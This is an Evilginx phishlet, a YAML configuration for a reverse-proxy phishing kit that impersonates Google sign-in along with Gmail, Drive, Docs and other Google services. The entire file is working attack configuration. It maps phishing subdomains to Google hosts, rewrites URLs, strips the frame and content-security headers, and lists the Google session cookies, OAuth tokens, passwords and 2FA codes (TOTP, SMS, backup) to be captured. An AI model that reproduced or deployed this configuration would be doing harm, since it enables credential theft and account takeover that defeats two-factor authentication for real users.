min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://accounts.google.com/'

proxy_hosts:
  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'google.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'drive', orig_sub: 'drive', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'docs', orig_sub: 'docs', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'play', orig_sub: 'play', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'photos', orig_sub: 'photos', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'calendar', orig_sub: 'calendar', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'oauth2', orig_sub: 'oauth2', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'ssl', orig_sub: 'ssl', domain: 'gstatic.com', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Replace Google domain URLs
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'https://accounts\\.google\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'mail', domain: 'google.com', search: 'https://mail\\.google\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'drive', domain: 'google.com', search: 'https://drive\\.google\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'docs', domain: 'google.com', search: 'https://docs\\.google\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'myaccount', domain: 'google.com', search: 'https://myaccount\\.google\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'google.com', search: 'https://www\\.google\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'play', domain: 'google.com', search: 'https://play\\.google\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'photos', domain: 'google.com', search: 'https://photos\\.google\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'calendar', domain: 'google.com', search: 'https://calendar\\.google\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'apis', domain: 'google.com', search: 'https://apis\\.google\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'oauth2', domain: 'google.com', search: 'https://oauth2\\.googleapis\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  
  # Replace Google CDN URLs
  - {triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'gstatic.com', search: 'https://ssl\\.gstatic\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'ssl', domain: 'gstatic.com', search: 'https://[a-z0-9-]+\\.gstatic\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/javascript']}
  
  # Remove security headers
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'accounts', domain: 'google.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'mail', domain: 'google.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'accounts.google.com', orig_sub: 'mail', domain: 'google.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary Google authentication cookies
  - domain: '.google.com'
    keys: ['SID', 'HSID', 'SSID', 'APISID', 'SAPISID', '__Secure-3PSID', '__Secure-3PAPISID', '__Secure-1PSID', '__Secure-1PAPISID']
    type: 'cookie'
  
  # Session and security cookies
  - domain: '.google.com'
    keys: ['NID', 'OGPC', 'OGP', 'OGPC', '1P_JAR', 'AEC', 'CONSENT']
    type: 'cookie'
    optional: true
  
  # OAuth and API tokens
  - domain: '.google.com'
    keys: ['oauth_token', 'oauth_token_secret', 'access_token', 'refresh_token']
    type: 'cookie'
    optional: true
  
  # Gmail-specific cookies
  - domain: '.google.com'
    keys: ['GMAIL_AT', 'GMAIL_RTT', 'GX', 'COMPASS']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'Email'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'Passwd'
    search: '(.*)'
    type: 'post'
  
  # Alternative email field
  email:
    key: 'email'
    search: '(.*)'
    type: 'post'
  
  # Phone number field
  phone:
    key: 'phoneNumber'
    search: '(.*)'
    type: 'post'
  
  # 2FA codes
  totp_code:
    key: 'totpCode'
    search: '(.*)'
    type: 'post'
  
  sms_code:
    key: 'smsCode'
    search: '(.*)'
    type: 'post'
  
  # Backup codes
  backup_code:
    key: 'backupCode'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '^/ServiceLogin'
  - '^/accounts/SetSID'
  - '^/accounts/CheckCookie'
  - '^/accounts/OneClick'
  - '^/myaccount'
  - '^/mail'
  - '^/drive'
  - '^/docs'

login:
  domain: 'accounts.google.com'
  path: '/ServiceLogin'

